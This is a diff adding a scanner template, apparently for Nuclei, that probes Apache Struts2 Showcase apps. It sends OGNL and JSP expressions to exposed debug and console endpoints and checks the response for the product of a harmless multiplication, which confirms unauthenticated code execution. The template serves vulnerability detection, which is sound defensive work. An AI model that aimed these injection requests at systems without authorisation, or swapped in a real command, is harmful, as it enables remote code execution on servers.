@@ -1,0 +1,42 @@
+id: struts2-showcase-console-safe
+
+info:
+  name: Struts2 Showcase - Interactive Console Safe RCE
+  author: seal
+  severity: critical
+  description: Exploits the unauthenticated OGNL and JSP consoles exposed in Struts2 Showcase application using direct math evaluation to bypass SecurityMemberAccess and SiteMesh filter crashes.
+  tags: safe-poc, struts2, ognl, jsp, exploit
+
+http:
+  - raw:
+      # Payload 1: 通过 /integration/saveGangster.action 触发 OGNL
+      - |
+        POST {{BaseURL}}/integration/saveGangster.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        debug=command&expression=111111111*9
+
+      # Payload 2: 通过 /nodecorate/jspEval.action 触发 JSP 原生代码执行
+      - |
+        POST {{BaseURL}}/nodecorate/jspEval.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        jsp=%3C%25%3D111111111*9%25%3E
+
+      # Payload 3: 通过 /nodecorate/jspEval.action 触发 OGNL
+      - |
+        POST {{BaseURL}}/nodecorate/jspEval.action HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        debug=command&expression=111111111*9&jsp=1
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "999999999"
